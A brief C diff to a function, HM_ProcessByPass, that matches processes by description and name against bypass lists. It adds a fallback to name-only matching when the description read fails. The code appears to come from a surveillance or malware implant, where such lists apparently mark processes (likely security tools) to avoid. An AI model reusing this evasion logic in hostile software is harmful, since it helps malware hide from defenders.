@@ -503,6 +503,7 @@ BOOL HM_ProcessByPass(DWORD pid)
 	char *process_name;
 	WCHAR process_description[500];
 	DWORD i;
+	BOOL desc_failed = FALSE;
 
 	// Faccio prima un check sulle descizioni
 	if (ReadDesc(pid, process_description, sizeof(process_description))) {
@@ -510,7 +511,8 @@ BOOL HM_ProcessByPass(DWORD pid)
 			if (process_bypass_desc[i][0]!=0 && CmpWildW(process_bypass_desc[i], process_description))
 				return TRUE;
 		}
-	}
+	} else
+		desc_failed = TRUE;
 
 	// Prende il nome del processo "pid"
 	if ( !(process_name = HM_FindProc(pid)) )
@@ -521,7 +523,7 @@ BOOL HM_ProcessByPass(DWORD pid)
 		if (CmpWild((unsigned char *)process_bypass_list[i], (unsigned char *)process_name)) {
 			SAFE_FREE(process_name);
 			// Se e' uno dinamico, o non ho descrizione valida, allora controlla solo il nome
-			if (i>=EMBEDDED_BYPASS || process_bypass_desc[i][0]==0)
+			if (i>=EMBEDDED_BYPASS || process_bypass_desc[i][0]==0 || desc_failed)
 				return TRUE;
 			return FALSE;
 		}
